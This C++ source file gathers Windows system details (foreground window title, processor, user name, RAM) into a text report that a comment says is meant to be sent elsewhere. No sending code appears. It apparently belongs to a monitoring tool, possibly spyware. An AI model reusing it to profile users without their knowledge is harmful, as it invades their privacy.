#include "SysParameter.hpp"
#include <Windows.h>
#include <Lmcons.h>

void SysParameter::mainFunc()
{
	getForegroundInfo();//check the name actual front-drawing window
	getProcessorInfo();//check the processor parameters
	getUserInfo();//check the name actual logged user 
	getRamInfo();//check the ram size
}

/// <summary>
/// Return the information to send without polish symbols.
/// </summary>
/// <returns>Finished summary about system parameters</returns>
std::string SysParameter::getInformation()
{
	std::string text;
	text += "[Parametry systemowe] \n";
	text += "Aktualnie wyswietlane okno " + ch_ForeGroundWindows + "\n";
	text += "Architektura procesora: " + ch_ProcessorArchitecture + "\n";
	text += "Typ procesora: " + ch_ProcessorType + "\n";
	text += "Nazwa uzytkownika: " + ch_UserName + "\n";
	text += "Ilosc pamieci RAM: " + std::to_string(f_RamSize) + "\n";
	text += "[/Parametry systemowe] \n";
	return text;
}

void SysParameter::getForegroundInfo()
{
	HWND hwnd = GetForegroundWindow();
	if (hwnd != nullptr)
	{
		char wnd_title[256];
		GetWindowText(hwnd, wnd_title, sizeof(wnd_title));//Get title foreground windows
		if (wnd_title != nullptr)
			ch_ForeGroundWindows = wnd_title;//Copy the titles to string
	}
}
/// <summary>
/// Return the processor brand.
/// Table with types processor is available on:
/// https://msdn.microsoft.com/pl-pl/eng-eng/library/windows/desktop/ms724958(v=vs.85).aspx
/// </summary>
/// <returns>Processor brand</returns>
std::string SysParameter::getProcessorBrand(WORD processorArchitecture)
{
	std::string pType;//processor type

	switch (processorArchitecture)
	{
	case PROCESSOR_ARCHITECTURE_AMD64://amd or intel
		pType = "Intel/AMD 64 bit";
		break;

	case PROCESSOR_ARCHITECTURE_ARM://mobile processor
		pType = "ARM 32 bit";
		break;

	case PROCESSOR_ARCHITECTURE_ARM64://mobile processor 64 bit
		pType = "ARM 64 bit";
		break;

	case PROCESSOR_ARCHITECTURE_IA64:
		pType = "Intel Itanium-based 64 bit";
		break;

	case PROCESSOR_ARCHITECTURE_INTEL:
		pType = "Intel 32 bit";
		break;

	default:
		pType = "Unknown the processor brand";
		break;
	}

	return pType;
}


/// <summary>
/// Return the type of the processor.
/// Table with types of processor is available on:
/// https://msdn.microsoft.com/pl-pl/eng-eng/library/windows/desktop/ms724958(v=vs.85).aspx
/// </summary>
/// <param name="processorType">Type of the processor.</param>
/// <returns>Processor type</returns>
std::string SysParameter::getProcessorType(DWORD processorType)
{
	std::string tProcessor;//type processor

	switch (processorType)
	{
	case PROCESSOR_INTEL_PENTIUM:
		tProcessor = "Intel Pentium";
		break;

	case PROCESSOR_INTEL_IA64:
		tProcessor = "Intel IA64";
		break;
	case PROCESSOR_AMD_X8664:
		tProcessor = "Amd x86 or x64";
		break;
	case PROCESSOR_ARM720:
		tProcessor = "ARM 720";
		break;
	case PROCESSOR_ARM820:
		tProcessor = "AMR 820";
		break;
	case PROCESSOR_ARM920:
		tProcessor = "ARM 920";
		break;

	default:
		tProcessor = "Unknown the processor type";
		break;
	}

	return tProcessor;
}

/// <summary>
/// Get the processor information from SYSTEM_INFO structure.
/// </summary>
void SysParameter::getProcessorInfo()
{
	SYSTEM_INFO * siSysInfo = new SYSTEM_INFO();
	GetSystemInfo(siSysInfo);	// Copy the hardware information to the SYSTEM_INFO structure. 

	ch_ProcessorArchitecture = getProcessorBrand(siSysInfo->wProcessorArchitecture);//Filling the strings with selected information
	ch_ProcessorType = getProcessorType(siSysInfo->dwProcessorType);

	delete siSysInfo;//release memory
}

/// <summary>
/// Get the user name.
/// </summary>
void SysParameter::getUserInfo()
{
	TCHAR name[UNLEN + 1];
	DWORD size = UNLEN + 1;

	if (GetUserName((TCHAR*)name, &size))//Checking a valid of gets user name
		ch_UserName = name;//correct
	else
		ch_UserName = "Cannot get user name";//error
}

/// <summary>
/// Get the windows version and ram size.
/// </summary>
void SysParameter::getRamInfo()
{
	MEMORYSTATUSEX * statex = new MEMORYSTATUSEX();

	statex->dwLength = sizeof(*statex); // I misunderstand that

	GlobalMemoryStatusEx(statex);
	f_RamSize = (float)statex->ullTotalPhys / (1024 * 1024 * 1024);
	
	delete statex;//Release memory
}


